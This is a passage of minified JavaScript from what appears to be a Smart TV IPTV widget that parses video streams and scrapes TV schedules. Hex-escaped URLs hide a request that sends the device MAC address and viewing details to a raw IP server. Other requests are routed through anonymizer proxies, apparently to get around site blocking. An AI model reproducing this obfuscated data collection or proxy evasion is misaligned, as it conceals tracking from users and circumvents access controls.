  };
  x2.open('GET', x, true);
  x2.send(null);
};
function Get_Moon_xml_s(ul) {
  alert('Start --Get_Moon_xml_s--');
  var x = "\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x34\x2E\x36\x37\x2E\x32\x32\x33\x2E\x36\x32\x2F\x6D\x6F\x6F\x6E\x2E\x70\x68\x70\x3F\x73\x65\x72\x6D\x6F\x6F\x6E\x3D" + encodeURIComponent(ul) + "&img=" + encodeURIComponent(Ach(2)) + "&title=" + encodeURIComponent(Ach(0)) + "&box_mac=" + P1;
  F78(x);
  return;
};
function Include(e) {
  var head = document.getElementsByTagName('head')[0];
  var script = document.createElement('script');
  script.type = 'text/javascript';
  script.src = e;
  head.appendChild(script)
};
function R85(r) {
  var m,
  arr,
  r1,
  r2,
  uar,
  ne;
  for (var j in r) {
    m = R98(r[j], "itag%3D", "%26");
    ne = 0;
    if (m) {
      switch (m) {
      case "37":
        ne = 1080;
        break;
      case "22":
        ne = 720;
        break;
      case "35":
        ne = 480;
        break;
      case "18":
        ne = 360;
        break;
      case "36":
        ne = 240;
        break
      };
      if (ne) {
        arr = r[j]["split"]("%26");
        r[j] = "";
        r1 = "";
        r2 = "";
        for (var k in arr) {
          if (arr[k]) {
            arr[k] = R95(arr[k]);
            if (arr[k]["indexOf"]("url=") == 0) {
              r1 = arr[k]["replace"]("url=", "");
            } else {
              if (arr[k]["indexOf"]("sig=") == 0 || arr[k]["indexOf"]("signature=") == 0) {
                r2 = arr[k]["replace"]("sig=", "signature=");
              } else {
                if (arr[k]["indexOf"]("s=") == 0) {
                  r2 = Y14(arr[k])
                }
              }
            }
          };
          if (r1 && (r1["indexOf"]("sig=") > 0 || r1["indexOf"]("signature=") > 0 || r1["indexOf"]("&s=") > 0)) {
            if (r1["indexOf"]("&s=") >= 0) {
              uar = r1["split"]("&s=")[1];
              r[j] = uar[0] + "&" + Y14(uar[1]["split"]("&")[0]);
            } else {
              r[j] = r1["replace"]("sig=", "signature=");
              r[j] = r1["replace"](",", "%2C");
            };
            break
          } else {
            if (r1 && r2) {
              r[j] = r1 + "&" + r2;
              break
            }
          }
        };
        if (!r[j]) {
          continue
        };
        P59["push"]([r[j], ne]);
        if (!Q3 && ne <= O12[A["A17"]]) {
          Z18 = P59["length"] - 1;
          R42(r[j]);
        }
      };
      if (ne == 240) {
        break
      }
    } else {
      if (j > 3) {
        break
      }
    }
  };
  Y70();
};
function F45(q, z) {
  try {
    if (!q) {
      Q72 = 0
    };
    Y91(Q2);
    Y91(Load_timer);
    P78 = "";
    P75 = 0;
    if (/(\/720p)/["test"](Ach(1)) && Ach(1).indexOf('/serial/') > 0 && Ach(1).indexOf('/go/seria/') < 0) {
      return xml_k(Ach(1))
    };
    if (/(\/iframe)/["test"](Ach(1)) && Ach(1).indexOf('/serial') > 0 && Ach(1).indexOf('episode') < 0) {
      return xml_s(Ach(1))
    };
    if (!q && A["A2"] && Ach(5)["indexOf"]("Open") != 0) {
      if ((Ach(0) && (Y83(Ach(0), Ach(5), Ach(12)) || /([\d\/\.\s\(\[\{\-&_="',]+|^)(xxx|porno|sex|erotica|adult|18+|секс|порно|эротика|aнал|клубничка|ххх)/i["test"](Ach(0)))) || Ach(5)["indexOf"]("history.dat") >= 0) {
        P77 = 1;
        if (Ach(5) && Ach(5)["indexOf"]("history.dat") < 0) {
          Q50 = ""
        };
        return R63()
      }
    };
    if (Ach(5)) {
      if (Q65 < 22 && (Ach(5) == "http://local" || Ach(5)["indexOf"]("/MediaServer/Folders/") > 0 || Ach(5)["indexOf"]("SearchUSB") == 0 || Ach(5)["indexOf"]("/@?") > 0)) {
        return R65()
      };
      if (!P82) {
        if (Ach(5)["toLowerCase"]() == "exit") {
          P6 = 1;
          return Y40()
        };
        if (Ach(5)["toLowerCase"]() == "stop") {
          return
        };
        if (Ach(5)["toLowerCase"]() == "return") {
          return F43()
        };
        if (Ach(5) == "GetYaBaseInfo") {
          return R90()
        };
        if (Ach(5) == 'ex' + _f[0]) {
          return FOO()
        };
        if (Ach(5) == "backup") {
          return F03()
        };
        if (Ach(5) == "restore") {
          return F07()
        };
        if (Ach(5) == "cleaning") {
          return F01()
        };
        if (Ach(5) == "Settings") {
          return R70()
        };
        if (Ach(5) == "DelHistory") {
          return Y78()
        };
        Z38 = 0;
        if (Ach(5)["indexOf"]("ReadFavCh|#|") == 0) {
          Z38 = 1;
          return F93(O19[1], Q26)
        }
      };
      if (Ach(5)["indexOf"]("/common/WIDGET") > 0) {
        Q39[P27][5] = Ach(5)["replace"]("WIDGET", Q_75)
      }; ;
      if (Ach(5)["indexOf"]("XML/usb.xml") == 0) {
        Q39[P27][5] = '\x68\x74\x74\x70\x3A\x2F\x2F\x69\x70\x2D\x73\x6D\x61\x72\x74\x2D\x74\x76\x2E\x75\x63\x6F\x7A\x2E\x63\x6C\x75\x62\x2F' + Ach(5)
      };
      if (Ach(5)["indexOf"](_f[5]) > 0 && Ach(5)["indexOf"](_f[4] + 'i') < 0 && Q49 == '\x49\x50\x54\x56') {
        Q39[P27][5] = Ach(5)["replace"](_f[5], _f[5] + _f[4])
      };
      P73 = 1;
      F47(Ach(5))
    } else {
      if (Ach(1)) {
        if (/(\.zip)$/i["test"](Ach(1))) {
          if (!P7 || P9) {
            return R9(L[221] + " !", 1)
          };
          if (!Q86) {
            Q86 = 1;
            return R9(L[61] + " !", 1, 6000, 1)
          };
          Z47 = Ach(0)["replace"](/\.(\w+)$/, "")["replace"](/\W/g, "");
          if (!Z47) {
            R9(L[223] + " !", 1)
          } else {
            R9(L[62] + " !", 1, 5000);
            P5 = 0;
            Y92("F46(Ach(1))", 1500)
          };
          return
        };
        P76 = 0;
        if (P98["test"](Ach(1))) {
          P76 = 1
        } else {
          if (P89 > -1) {
            return F50()
          }
        };
        if (Q3) {
          if (P15) {
            if (Ach(1)["indexOf"]("#no_stop") < 0) {
              R40()
            }
          } else {
            F54()
          }
        };
        if (Ach(1)["toLowerCase"]() == "stop" || (Ach(1)["indexOf"](".m3u8?archive") > 0 && Ach(1)["indexOf"]("://") < 0)) {
          return
        };
        if (Q54 && Q54["indexOf"]("/@?") < 0 && P90 == -1) {
          return R9(L[63], 1, 20000, 1)
        };
        F23();
        P29 = P24;
        P28 = P26;
        P30 = P27;
        P12 = P13;
        Q42 = Q41;
        Q90 = [];
        Q93 = 0;
        P87 = "";
        Z57 = "";
        if (!q) {
          Z26 = 0;
          Q90 = []
        };
        P57["push"]([P24, P26, P27]);
        if (P57["length"] > 2) {
          P57["unshift"]()
        };
        Y7(Y11("p_ch_name"), Ach(0));
        F9("ch_numbar_nun", P27 + 1);
        Y13("main,resolution");
        pluginAPI["setOffScreenSaver"]();
        F51(Ach(1), Ach(12), z)
      } else {
        Y6(13)
      }
    }
  } catch (e) {}
};
function R88(ul, c_e, y_i, f_g, ix) {
  var _r = ["\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x6E\x6F\x6E\x79\x6D\x69\x7A\x65\x72\x2E\x6C\x6F\x6F\x6B\x6D\x65\x2E\x63\x7A\x2F\x69\x6E\x64\x65\x78\x2E\x70\x68\x70\x3F\x71\x3D", "\x68\x74\x74\x70\x3A\x2F\x2F\x65\x6C\x69\x74\x65\x70\x76\x70\x65\x72\x73\x74\x75\x74\x2E\x73\x77\x65\x62\x2E\x63\x7A\x2F\x69\x6E\x64\x65\x78\x2E\x70\x68\x70\x3F\x71\x3D", "\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x62\x65\x72\x74\x72\x61\x6E\x64\x70\x6F\x74\x61\x72\x74\x2E\x63\x6F\x6D\x2F\x66\x72\x65\x65\x73\x75\x72\x66\x2F\x69\x6E\x64\x65\x78\x2E\x70\x68\x70\x3F\x71\x3D"];
  if (k > 2) {
    k = 0
  };
  try {
    function ForTime(val) {
      return (val < 10 ? "0" + (val) : val)
    };
    var y_d = Y44();
    var date111 = new Date(y_d * 86400000),
    formatDate = date111.getFullYear() + '-' + ForTime(date111.getMonth() + 1) + '-' + ForTime(date111.getDate());
    if (O53) {
      var ar = O53["split"]("_");
      c_e = ar[1];
      y_i = ar[2]
    };
    if (ul == 'mailru') {
      ul = "https://tv.mail.ru/ajax/channel/?region_id=" + c_e + "&channel_id=" + y_i + "&date=" + formatDate
    };
    if (ul == 'vsetv') {
      ul = "http://www.vsetv.com/schedule_channel_" + y_i + "_day_" + formatDate + "_ft_all.html"
    };
    if (O53["indexOf"]("yandex_") >= 0 && ul == 'yandex') {
      ul = "https://pda.tv.yandex.ru/" + c_e + "/channels/" + y_i + '?date=' + formatDate + '&grid=main&period=all-day' + f_g + '&nocookiesupport=yes'
    };
    if (O53["indexOf"]("epgurl_") >= 0) {
      ul = F_7('http://domkuka.de/tv/teleguide.php' + '?reg=' + c_e + '&day=' + y_d + '&channel=' + y_i)
    };
    if (P68) {
      ul = y_i
    } else {
      ul = (ul['indexOf']('epg_url:') == 0) ? (ul['indexOf']('.php') > 0 ? F_7(ul['replace']('epg_url:', 'http://') + '?reg=' + c_e + '&day=' + y_d + '&channel=' + y_i) : ul['replace']('epg_url:', 'http://') + '/' + c_e + '/' + y_d + '/' + y_i + '.prdat') : !ul ? "https://pda.tv.yandex.ru/" + c_e + "/channels/" + y_i + '?date=' + formatDate + '&grid=main&period=all-day' + f_g + '&nocookiesupport=yes' : ul
    };
    if ((ul['indexOf']('mailru') > 0 || ul['indexOf']('tv.mail') > 0 || (ul['indexOf']('yandex') >= 0 && ul["indexOf"]("%3A%2F%2Fpda.tv.yandex") < 0)) && A.A37) {
      ul = _r[k] + encodeURIComponent(ul + "&hl=3e5");
      alert('k===' + k);
      k++
    };
    if (ul["indexOf"]("%3A%2F%2Fpda.tv.yandex") > 0 && ul["indexOf"]("&hl=3e5") < 0) {
      ul = ul + "&hl=3e5"
    };
    F33();
    P40 = Y92('R87()', 15000);
    Z51 = new XMLHttpRequest();
    if (P7 && Z51['overrideMimeType']) {
      Z51['overrideMimeType']('text/html')
    };
    Z51['onreadystatechange'] = function () {
      if (P40 < 0) {
        return
      };
      if (Z51 && Z51['readyState'] == 4) {
        Y91(P40);
        if (Z51['status'] == 200) {
          var a = Z51['responseText'];
          if (!P68) {
            var ar,
            par,
            s0,
            s1,
            s2,
            s3,
            id,
            au,
            pu,
            ti,
            tl,
            p_ar = [],
            arr = [],
            t0 = Y44() * 86400,
            sar,
            d_arr = "",
            t = /time\">(.*?)<\/div>/gm,
            c = /<div class=\"prname2\">(.*?)<\/div>/gm,
            ts;
            if (O53['indexOf']('epgurl') >= 0) {
              par = a['split']('\x0A');
              for (var i = 0; i < par['length']; i++) {
                ar = dSp(par[i])['split']('|');
                if (ar['length'] < 2 || isNaN(ar[0])) {
                  continue
                };
                ti = Number(ar[0]);
                tl = rI(ar[1]);
                id = ar['length'] > 2 ? ar[2] : '';
                au = ar['length'] > 3 ? ar[3] : '';
                pu = ar['length'] > 4 ? ar[4] : '';
                p_ar['push']([ti, tl, id, au, pu])
              }
            };
            if (O53['indexOf']('yandex') >= 0) {
              a = a['replace'](/&amp;/g, '&');
              s1 = a['indexOf']('</div><div class="channel-select">');
              if (s1 < 0) {
                if (Q94 > 2 && (a['indexOf']('window.location.replace') > 0 || a['indexOf']('<div class="b-attention">') > 0)) {
                  Q78 = 1;
                  Q99 = 0;
                  return R88(ul, c_e, y_i, f_g, ix)
                };
                s1 = a['indexOf']('window.location.replace') > 0 ? tRe(L[210] + '.' + O13[A['A5']] + ' ' + L[211] + '<br>' + L[212]) : '';
                return R87(c_e, y_i, s1, ul)
              };
              s2 = '<div class="b-banner">';
              s3 = a['indexOf'](s2);
              if (s3 > 0 && s3 < s1) {
                s1 = s3
              };
              s2 = '<div class="b-text">';
              s3 = a['indexOf'](s2);
              if (s3 > 0) {
                s0 = a['indexOf']('</div></div><div class="b-select">');
                if (s0 < 0) {
                  R87(c_e, y_i, '', ul)
                } else {
                  s3 = a['substring'](s3 + s2['length'], s0);
                  if (s3) {
                    R87(c_e, y_i, s3, ul)
                  } else {
                    P38 = 0;
                    R86(y_i)
                  }
                };
                return
              };
              if (A.A37) {
                a = a.replace(/\%3A%2F%2F/g, "://");
                a = a.replace(/\%2F/g, "/");
                a = a.replace(/\%3F/g, "?");
                a = a.replace(/\%3D/g, "=");
                a = a.replace(/&b=24/g, "");
                a = a.replace(/%26/g, "&");
                a = a.replace(/&amp%3B/g, "&");
                a = a.replace(/http:\/\/proxy.aboutip.de\/index.php\?q=/g, "");
                a = a.replace(/\/browse.php\?u=/g, "");
                a = a.replace(/https:\/\/pda.tv.yandex.ru/g, "");
                s2 = 'href="/' + c_e + '/channels/' + y_i + '?date=' + formatDate + '&grid=main&period=all-day'
              } else {
                s2 = 'href="?date=' + formatDate + f_g + '&grid=main&period=all-day'
              };
              s3 = a['indexOf'](s2);
              if (s3 < 0) {
                return R87(c_e, y_i, '', ul)
              };
              a = a['substring'](s3 + s2['length'], s1);
              s0 = '<\/span><span class="calendar__weekday">';
              s1 = a['indexOf'](s0);
              if (s1 < 0) {
                return R87(c_e, y_i)
              };
              a = a['replace'](s0, '');
              a = a['substr'](a['indexOf']('</h1></div></a>') + 15);
              var arr = a['split']('</a>'),
              t0 = Y44() * 86400,
              sar;
              P43 = -1;
              for (var i in arr) {
                if (!P33) {
                  return
                };
                sar = dSp(arr[i])['split']('</span>');
                if (sar['length'] != 2) {
                  break
                };
                id = R98(sar[0], 'program/', '\"><span class=\"channel__event-time\">');
                ti = Y46(t0, R98(sar[0], id + '\"><span class=\"channel__event-time\">'));
                tl = sar[1];
                id = id['replace']('<tr>', '')['replace']('?eventId=', '\/');
                if (!id || !ti || !tl) {
                  break
                };
                p_ar['push']([ti, tl, id, '', ''])
              }
            };
            if (a.indexOf('class="adver"') > 0 && a.indexOf('id="schedule_container"') > 0) {
              if (!O51['length'] && !O52['length']) {
                R102()
              };
              a = R98(a, 'id="schedule_container"', 'class="adver"');
              if (O51['length'] > 0) {
                for (var i in O51) {
                  a = R101(O51[i], O52[i], a)
                }
              };
              p_ar = [],
              ti = "",
              tl = "",
              P43 = -1;
              a = a.replace(/<img(.*?)>/g, "");
              a = a.replace(/<\/a>/g, "");
              a = a.replace(/class=b/g, "");
              var tim = a.match(t);
              var disc = a.match(c);
              for (var i = 0; i < tim.length; i++) {
                ti = Y46(t0, R98(tim[i], 'time">', '</div>'));
                tl = R98(disc[i], 'prname2">', '</div>');
                if (tl.indexOf("href=") > 0) {
                  ts = R98(tl, 'href=', '>');
                  tl = R101('<a href=' + ts + '>', '', tl);
                  ts = "www.vsetv.com/" + ts
                } else {
                  ts = ""
                };
                p_ar['push']([ti, tl, ts, "", ""])
              }
            };
            if (a['indexOf']('current_ts') >= 0) {
              a = String(a);
              var f = Y8(a);
              p_ar = [];
              P43 = -1;
              if (f.schedule[0].event.past.length > 0 || f.schedule[0].event.current.length > 0) {
                for (var z = 0; z < f.schedule[0].event.past.length; z++) {
                  p_ar['push']([dSp(Y46(t0, f.schedule[0].event.past[z].start)), dSp(f.schedule[0].event.past[z].name + " " + f.schedule[0].event.past[z].episode_title), "tv.mail.ru/ajax/event/?id=" + f.schedule[0].event.past[z].id + "&region_id=all", "", ""])
                };
                for (var j = 0; j < f.schedule[0].event.current.length; j++) {
                  p_ar['push']([dSp(Y46(t0, f.schedule[0].event.current[j].start)), dSp(f.schedule[0].event.current[j].name + " " + f.schedule[0].event.current[j].episode_title), "tv.mail.ru/ajax/event/?id=" + f.schedule[0].event.current[j].id + "&region_id=all", "", ""])
                }
              }
            };
            if (p_ar['length']) {
              if (P38 >= 0 && !f_g) {
                P46['push']([O53, y_d, c_e, p_ar]);
                if ((!P7 && P46['length'] > 50) || P46['length'] > 100) {
                  P46['shift']()
                }
              };
              R89(y_i, f_g, c_e, p_ar, ix)
            } else {
              return R87(c_e, y_i, '', ul)
            }
          } else {
            if (a['indexOf']('yandex') > 0) {
              var t_i = R98(a, '<div class="channel-title channel-title_meta">', '<div class="search-form">');
              if (!t_i) {
                t_i = a['indexOf']('window.location.replace') > 0 ? tRe(L[210] + '.' + O13[A['A5']] + ' ' + L[211] + '<br>' + L[212]) : '';
                return R87('', '', t_i, ul)
              };
              t_i = R98(t_i, '<div class="channel-title__text">');
              if (t_i) {
                t_i = t_i['replace']('</a>', '')['replace']('</div><div class="channel-title__text">', ', ')['replace']('</div></div><div class="event__text">', '</h3></td></tr></table><p> ')['replace']('</div></div><div class="event__label event__meta">', '</h3></td></tr></table><p> ')['replace']('</div><div class="event__text">', '&nbsp')['replace'](/&#13/g, '');
                var i_i = R98(a, 'class="image event__image"', '<a class="link event__timing"');
                i_i = "<img " + i_i['replace']('alt=""', '')
              };
              if (i_i) {
                i_i = i_i['replace']('\/400x300"', '\/middle"')['replace']('\/large"', '\/middle"')
              };
              if (A.A37 && i_i['indexOf']('/browse.php?u=') >= 0) {
                i_i = i_i.replace("/browse.php?u=", "http://nanoproxy.de/browse.php?b=24&f=norefer&u=")
              };
              i_i = i_i.replace(/\&amp;b=24/g, "");
              i_i = i_i['replace']('?q=', '?hl=2c7&q=');
              i_i = unescape(i_i);
              if (i_i['indexOf']('/browse.php?u=') >= 0) {
                i_i = i_i.replace(/\/browse.php\?u=/g, "")
              };
              if (!A.A37) {
                i_i = i_i.split("http");
                if (i_i['length'] > 2) {
                  i_i = 'img  src="http' + i_i[2]
                } else {
                  i_i = i_i.join("http")
                }
              };
              if (!P33 || ix != P27) {
                return
              };
              ss = "<table fontSize='20px'><table><tr><td style='vertical-align:top;padding-right:8px'>" + i_i + "</td><td style='color:#00ccff;'><h3>" + tRe(t_i) + "</table>";
              F35(t_i && P33 ? ss : L[213] + " !", "")
            };
            if (a['indexOf']('"layout"') > 0) {
              var f = Y8(a);
              i_i = (typeof(f['layout']['og']['image']['src']) == "undefined") ? f.tv_event.tv_gallery.items[0].original.src : f['layout']['og']['image']['src'];
              t_i = f['tv_event']['descr'];
              if (k < 1) {
                k = 1
              };
              t_m = (typeof(f['tv_event']['episode_title']) != "undefined") ? f['tv_event']['episode_title'] : "";
              ss = "<table fontSize='20px'><table><tr><td style='vertical-align:top;padding-right:8px'><img  src='" + _r[k - 1] + encodeURIComponent(i_i) + "&hl=40' width='135' height='125' /></td><td style='color:#00ccff;'><h3>" + f['tv_event']['name'] + "  " + t_m + "&nbsp;" + f['tv_event']['start']['mday'] + "&nbsp;" + f['tv_event']['start']['mon_sh'] + "&nbsp;" + "</h3></td></tr></table><p> " + t_i + "</div>";
              F35(t_i && P33 ? ss : L[213] + " !", "")
            };
            if (a['indexOf']('<td class="main">') > 0 && a['indexOf']('www.vsetv.com') > 0) {
              a = R98(a, '<td class="main">', '<div class="clear">');
              i_i = "";
              t_i = R98(a, '<span class="big">', '</span>');
              t_i = t_i.replace(/<(.*?)>/gm, " ");
              t_m = R98(a, '</h2>', '<span class="big">');
              t_m = t_m.replace(/\&nbsp\;/gm, " ");
              t_m = t_m["replace"](/(\t|\n|\r|\s+)/gm, " ");
              t_m = t_m.replace(/<strong>/gm, "fffffff");
              t_m = t_m.replace(/(<\/strong>|<\!--<span class="grey">)(.*?)class="showmain">/gm, "<br>");
              t_m = t_m.replace(/<(.*?)>/gm, " ");
              t_m = t_m.replace(/fffffff/gm, "<br>");
              t_i = t_m + "<br><br>" + t_i;
              t_m = R98(a, '<h2>', '</h2>');
              ss = "<table fontSize='20px'><table><tr><td style='vertical-align:top;padding-right:8px'><img  src='logos/film.png' width='135' height='125' /></td><td style='color:#00ccff;'><h3> " + t_m + "&nbsp; </h3></td></tr></table><p> " + t_i + "</div>";
              a = "";
              F35(t_i && P33 ? ss : L[213] + " !", "")
            }
          }
        } else {
          if (!Q78 && ul["indexOf"]("yandex.") > 0 && (Z51["status"] == 302 || Z51["status"] == 303 || Z51["status"] == 307) && Z51["getResponseHeader"]("Location") && Z51["getResponseHeader"]("Location")["indexOf"]("://") > 0) {
            R88(Z51["getResponseHeader"]("Location"), c_e, y_i, f_g, ix)
          } else {
            if (Q94 < 10 && P32 && !Q78 && ul["indexOf"]("yandex.") > 0 && (Z51["status"] == 0 || Z51["status"] == 1015 || Q99 > 2)) {
              Q78 = 1;
              Q99 = 0;
              R88(ul, c_e, y_i, f_g, ix)
            } else {
              R87(c_e, y_i, "", ul)
            }
          }
        }
      }
    };
    Z51["open"]("GET", ul, true);
    R99(Z51);
    Z51["send"]()
  } catch (e) {
    R87("", "", e, "")
  }
};
